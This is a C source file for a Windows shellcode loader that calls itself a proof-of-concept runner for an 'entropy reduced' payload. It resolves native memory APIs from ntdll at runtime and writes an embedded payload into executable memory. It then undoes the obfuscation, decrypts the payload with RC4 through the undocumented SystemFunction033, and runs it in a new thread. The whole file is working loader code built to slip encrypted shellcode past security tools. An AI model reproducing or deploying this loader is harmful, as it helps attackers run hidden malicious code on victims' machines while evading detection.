/*
	program that will read run an encrypted and entropy reduced shellcode blob from memory or anywhere you wanna stick it really.
*/

#include <Windows.h>
#include <stdio.h>
#include "EntropyReducer.h"
#include "Payload.h"

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten OPTIONAL
	);

typedef NTSTATUS(WINAPI* pfnNtAllocateVirtualMemory)(
  HANDLE    ProcessHandle,
  PVOID     *BaseAddress,
  ULONG_PTR ZeroBits,
  PSIZE_T   RegionSize,
  ULONG     AllocationType,
  ULONG     Protect
);

typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(
	HANDLE               ProcessHandle,
	PVOID*				 BaseAddress,
	PULONG				 NumberOfBytesToProtect,
	ULONG                NewAccessProtection,
	PULONG				 OldAccessProtection
);

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);


typedef NTSTATUS(NTAPI* fnSystemFunction033)(
	struct USTRING* Data,
	struct USTRING* Key
	);

BOOL ReportError(const char* ApiName) {
	printf("[!] \"%s\" [ FAILED ] \t%d \n", ApiName, GetLastError());
	return FALSE;
}



BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS	STATUS = NULL;

	USTRING		Key = {
			.Buffer = pRc4Key,
			.Length = dwRc4KeySize,
			.MaximumLength = dwRc4KeySize
	};

	USTRING 	Data = {
			.Buffer = pPayloadData,
			.Length = sPayloadSize,
			.MaximumLength = sPayloadSize
	};

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");

	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}


int main() {


	printf("[i] PoC runner for cryptropy, deobfuscate and decrypt a shellcode blob from memory\n");
	printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);


	PVOID pExecAddress         = NULL;
	HANDLE hThread             = NULL;
	PVOID pAddress             = NULL;
	SIZE_T sPayload = sizeof(Payload),
		   sObfSize = sizeof(Payload);
	DWORD      dwOldProtection = 0x00;

	unsigned char _key[0x10] = { 0 };

	pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

	NtAllocateVirtualMemory((HANDLE)-1, &pExecAddress, 0, &sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
	printf("[+} Alloacted : %p\n", pExecAddress);

	NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
	NtProtectVirtualMemory((HANDLE)-1, &pExecAddress, &sPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	
	NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");

	NtWriteVirtualMemory((HANDLE)-1, pExecAddress, &Payload, sPayload, NULL);

	printf("[+] Payload Written to : %p\n", pExecAddress);


//-------------------------------------------------------------------------------------------------------------

	SIZE_T	DeobfuscatedPayloadSize		= NULL;
	PBYTE	DeobfuscatedPayloadBuffer	= NULL;

	printf("[i] Deobfuscating");
	if (!Deobfuscate((PBYTE)pExecAddress, sObfSize, &(PBYTE)pExecAddress, &DeobfuscatedPayloadSize)) {
		return -1;
	}


	printf("[+] DONE \n");
	printf("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, pExecAddress);

//-------------------------------------------------------------------------------------------------------------
	
	memcpy(_key, pExecAddress, 0x10); //copy the first 16 bytes to _key
	pExecAddress = (PVOID)((ULONG_PTR)pExecAddress + 0x10); //update pointer to be after the first 16
	printf("[+] Pointer Updated\n");


	printf("[i] Decrypting with \n", pExecAddress);
	printf("[i] Retrieved Key: [ ");
	for (size_t i = 0; i < sizeof(_key); i++)
		printf("%02X ", _key[i]);
	printf("]\n");

	DWORD	dwResourceDataSize = DeobfuscatedPayloadSize - 0x10;

	//Decrypt the payload
	Rc4EncryptionViSystemFunc033(_key, (PBYTE)pExecAddress, sizeof(_key), dwResourceDataSize); 
	
	printf("[+] Payload Decrypted at : %p\n", pExecAddress); 
	printf("[$] Press <Enter> To Run ... ");
	getchar();

	hThread = CreateThread(NULL, NULL, pExecAddress, (PVOID)"pew pew", NULL, NULL);
	if (!hThread)
		return ReportError("CreateThread");

	WaitForSingleObject(hThread, INFINITE);
	
	printf("[+] DONE \n");

	return 0;
}

